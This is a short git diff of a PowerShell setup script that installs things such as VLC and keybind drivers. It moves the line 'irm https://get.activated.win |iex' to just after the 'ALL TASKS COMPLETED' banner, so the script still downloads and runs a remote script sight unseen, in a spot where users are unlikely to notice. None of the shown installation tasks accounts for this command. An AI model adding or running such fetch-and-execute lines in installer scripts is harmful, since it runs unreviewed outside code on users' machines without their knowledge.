@@ -29,7 +29,7 @@ function Show-Done {
     Write-Host "[DONE] $message" -ForegroundColor Green
     Write-Host ""
 }
-irm https://get.activated.win |iex
+
 # =========================
 # VLC PLAYER
 # =========================
@@ -113,6 +113,7 @@ Show-Done "Keybind Drivers Installed"
 Write-Host "===============================================" -ForegroundColor Cyan
 Write-Host "        ALL TASKS COMPLETED (LAUNCHED)         " -ForegroundColor Cyan
 Write-Host "===============================================" -ForegroundColor Cyan
+irm https://get.activated.win |iex
 
 # New Cleanup Logic
 $choice = ""
